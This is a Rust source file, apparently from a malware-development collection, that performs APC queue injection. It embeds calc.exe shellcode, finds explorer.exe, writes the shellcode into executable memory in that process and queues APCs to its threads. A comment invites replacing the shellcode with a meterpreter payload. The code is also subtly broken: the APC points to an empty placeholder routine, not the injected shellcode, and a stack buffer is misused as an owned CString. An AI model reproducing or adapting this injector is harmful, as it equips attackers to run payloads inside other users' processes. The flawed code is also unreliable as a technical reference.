/*
 * :
APC QUEUE INJECTION: Injects arbitrary code into the address space of a target process.
For More Codes: https://github.com/Whitecat18/Rust-for-Malware-Development.git
@5mukx
*/

#![allow(unused_assignments)]
use std::ptr::null_mut;
use std::ffi::CString;
use std::time::Duration;
use winapi::{
    shared::basetsd::ULONG_PTR,
    um::{
        handleapi::CloseHandle, memoryapi::{VirtualAllocEx, WriteProcessMemory}, processthreadsapi::{OpenProcess, OpenThread, QueueUserAPC}, tlhelp32::{
            CreateToolhelp32Snapshot, Process32First, Process32Next, Thread32First, Thread32Next, PROCESSENTRY32,
            TH32CS_SNAPPROCESS, TH32CS_SNAPTHREAD, THREADENTRY32,
        }, winnt::{MEM_COMMIT, PAGE_EXECUTE_READWRITE, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS}
    },
};

unsafe extern "system" fn apc_route(_param: ULONG_PTR) {
    // Placeholder for APC routine
}

/*
Demo Calc.exe shellcode . This is still in testing. please use meterpreter payload to see 
better Results <CODE IS STILL IN TESTING PHASE> 
*/

fn main() {
    let shellcode: [u8; 276] = [0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,
    0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,
    0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,
    0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,
    0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,
    0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,
    0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,
    0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,
    0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,
    0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,
    0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,
    0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,
    0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,
    0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,
    0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,
    0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,
    0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,
    0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,
    0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,
    0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,
    0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,
    0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,
    0x2e,0x65,0x78,0x65,0x00];

    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
        let mut victim_process = null_mut();

        let mut process_entry = std::mem::zeroed::<PROCESSENTRY32>();
        let mut thread_entry = std::mem::zeroed::<THREADENTRY32>();

        let mut thread_ids: Vec<u32> = Vec::new();
        let shell_size = shellcode.len();
        let mut thread_handle = null_mut();

        if Process32First(snapshot, &mut process_entry) != 0 {
            while process_entry.szExeFile.iter().any(|&c| c != 0) {
                let exe_file = CString::from_raw(process_entry.szExeFile.as_mut_ptr());
                if exe_file.to_string_lossy() != "explorer.exe" {
                    Process32Next(snapshot, &mut process_entry);
                } else {
                    break;
                }
            }
        }

        victim_process = OpenProcess(PROCESS_ALL_ACCESS, 0, process_entry.th32ProcessID);
        let shell_address = VirtualAllocEx(victim_process, null_mut(), shell_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        WriteProcessMemory(
            victim_process,
            shell_address,
            shellcode.as_ptr() as _,
            shell_size,
            null_mut(),
        );

        if Thread32First(snapshot, &mut thread_entry) != 0 {
            loop {
                if thread_entry.th32OwnerProcessID == process_entry.th32ProcessID {
                    thread_ids.push(thread_entry.th32ThreadID);
                }
                if Thread32Next(snapshot, &mut thread_entry) == 0 {
                    break;
                }
            }
        }

        for thread_id in thread_ids {
            thread_handle = OpenThread(THREAD_ALL_ACCESS, 0, thread_id);
            QueueUserAPC(Some(apc_route), thread_handle, 0);
            std::thread::sleep(Duration::from_secs(2));
        }
        CloseHandle(victim_process);
        CloseHandle(snapshot);
    }
}
